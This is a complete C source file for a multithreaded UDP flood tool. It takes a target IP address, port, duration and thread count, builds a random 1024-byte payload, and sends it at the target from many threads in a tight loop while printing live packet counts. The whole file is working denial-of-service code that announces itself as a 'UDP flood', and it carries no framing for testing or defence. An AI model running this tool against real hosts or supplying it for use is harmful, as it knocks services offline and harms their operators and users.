#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <stdatomic.h>
#include <fcntl.h>
#include <signal.h>   // Added for signal handling definitions

#define PAYLOAD_SIZE 1024
#define STATS_INTERVAL 1

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
} thread_args;

_Atomic long total_sent = 0;  // Renamed from total_packets
_Atomic long total_errors = 0;
volatile sig_atomic_t running = 1;

void int_handler(int sig) {
    running = 0;
}

void generate_payload(char *buffer, size_t size) {
    FILE *urandom = fopen("/dev/urandom", "rb");
    if (!urandom || fread(buffer, 1, size, urandom) != size) {
        perror("Payload generation failed");
        exit(EXIT_FAILURE);
    }
    fclose(urandom);
}

void *send_payload(void *arg) {
    thread_args *args = (thread_args *)arg;
    char payload[PAYLOAD_SIZE];
    struct sockaddr_in target_addr;
    int sockfd;
    time_t start_time;

    generate_payload(payload, PAYLOAD_SIZE);

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    if (inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr) <= 0) {
        perror("Invalid target IP address");
        close(sockfd);
        pthread_exit(NULL);
    }

    int buf_size = 1024 * 1024;
    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size)) < 0) {
        perror("Failed to set socket buffer size");
    }

    start_time = time(NULL);
    while (running && (time(NULL) - start_time < args->duration)) {
        ssize_t sent = sendto(sockfd, payload, PAYLOAD_SIZE, 0,
                             (struct sockaddr *)&target_addr, sizeof(target_addr));
        if (sent < 0) {
            atomic_fetch_add(&total_errors, 1);
        } else {
            atomic_fetch_add(&total_sent, 1);  // Updated variable name
        }
    }

    close(sockfd);
    pthread_exit(NULL);
}

void print_stats(int duration) {
    time_t start = time(NULL);
    while (running) {
        sleep(STATS_INTERVAL);
        int elapsed = (int)(time(NULL) - start);
        int remaining = duration - elapsed;
        
        printf("\r[%02d:%02d] Packets: %ld (Errors: %ld)     ",
               remaining / 60, remaining % 60,
               atomic_load(&total_sent),
               atomic_load(&total_errors));
        fflush(stdout);
        
        if (elapsed >= duration) running = 0;
    }
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <DURATION_SECONDS> <THREADS>\n", argv[0]);
        return EXIT_FAILURE;
    }

    struct sigaction sa = { .sa_handler = int_handler };
    sigaction(SIGINT, &sa, NULL);

    thread_args args;
    strncpy(args.target_ip, argv[1], 15);
    args.target_ip[15] = '\0';
    args.target_port = atoi(argv[2]);
    args.duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);

    pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
    if (!threads) {
        perror("Thread allocation failed");
        return EXIT_FAILURE;
    }

    for (int i = 0; i < thread_count; i++) {
        if (pthread_create(&threads[i], NULL, send_payload, &args)) {
            perror("Thread creation failed");
            running = 0;
            for (int j = 0; j < i; j++) pthread_join(threads[j], NULL);
            free(threads);
            return EXIT_FAILURE;
        }
    }

    printf("Starting UDP flood to %s:%d for %d seconds with %d threads\n",
           args.target_ip, args.target_port, args.duration, thread_count);
    
    print_stats(args.duration);

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n\nFinal results:\n");
    printf("Total packets sent: %ld\n", atomic_load(&total_sent));
    printf("Total errors: %ld\n", atomic_load(&total_errors));

    free(threads);
    return EXIT_SUCCESS;
}
